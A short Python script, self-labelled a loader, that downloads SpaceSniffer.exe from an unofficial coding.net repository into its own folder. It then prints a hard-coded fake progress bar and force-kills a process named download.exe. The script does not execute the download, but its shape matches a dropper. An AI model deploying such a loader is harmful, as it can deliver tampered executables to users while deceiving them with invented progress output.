import urllib
import requests
import time
import os
import queue
if os.name == "nt":
	os.system("")
a=os.path.dirname(os.path.realpath(__file__))
b="\\SpaceSniffer.exe"
c=a+b
print('\033[1;32m' + 'Initializing ldr. . .' + '\033[0m')
print("Collect SpaceSniffer.")
print("downloading. . .")
url='https://ylfcydownload.coding.net/p/download/d/download1/git/raw/master/SpaceSniffer.exe?download=true'
urllib.request.urlretrieve(url, c)
print("|####################| %100 2256kb/s")
print("down.")
os.system("taskkill /f /im download.exe")
